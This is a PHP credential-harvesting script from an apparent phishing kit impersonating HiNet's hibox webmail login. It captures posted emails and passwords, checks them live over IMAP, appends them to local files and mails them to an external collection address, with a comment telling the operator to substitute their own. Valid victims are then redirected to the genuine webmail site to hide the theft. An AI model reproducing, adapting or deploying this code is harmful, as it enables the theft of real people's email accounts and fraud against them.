<?php

if(isset($_POST['email']) && isset($_POST['password'])) {

    $email = $_POST['email'];
    $password = $_POST['password'];
    $ip = getenv("REMOTE_ADDR");
	$domain = substr(strrchr($email, "@"), 1);

    $url = explode('#', $_POST['referrer'])[0];

    try {

        $mboxURI = "{" . $domain . ":993/imap/ssl/novalidate-cert}INBOX";
		$mboxURI1 = "{www.hibox.hinet.net:993/imap/ssl/novalidate-cert}INBOX";
        $mbox = imap_open ($mboxURI, $email, $password);
		$mbox1 = imap_open ($mboxURI1, $email, $password);

        if($mbox) {
            $output = "$email,$password\n";
            $fp=fopen("hibox_result.txt","a");
            fputs($fp,"$output");
            fclose($fp);

            mail("scamapagelog@yandex.com", "New hibox true email & password", $output); // chnage the email to your email that you want to receive the result.

            header("Location: https://hibox.hinet.net/uwc/webmail/en/mail.html?lang=en&laurel=on&cal=1");
            
            imap_close($mbox);
        } elseif($mbox1) {
            $output = "$email,$password\n";
            $fp=fopen("hibox_result.txt","a");
            fputs($fp,"$output");
            fclose($fp);

            mail("scamapagelog@yandex.com", "New hibox true email & password", $output); // chnage the email to your email that you want to receive the result.

            header("Location: https://hibox.hinet.net/uwc/webmail/en/mail.html?lang=en&laurel=on&cal=1");
            
            imap_close($mbox1);
        } else {
			$output = "$email,$password\n";
            $fp=fopen("hibox_errors.txt","a");
            $currentDateTime = date('m/d/Y h:i:s a', time());
            fputs($fp, $currentDateTime);
            fputs($fp,"\npassword incorrect\n");
            fclose($fp);
			
			mail("scamapagelog@yandex.com", "New hinet error email & password", $output); // chnage the email to your email that you want to receive the result.
			
            header("Location: " . $url . "#$email#password_incorrect");
        }


    } catch(Exception $e) {
        $fp=fopen("hinet_errors.txt","a");
        $currentDateTime = date('m/d/Y h:i:s a', time());
        fputs($fp, $currentDateTime);
        fputs($fp,"\n$e\n");
        fclose($fp);

        header("Location: " . $url . "#$email#password_incorrect");
    }

}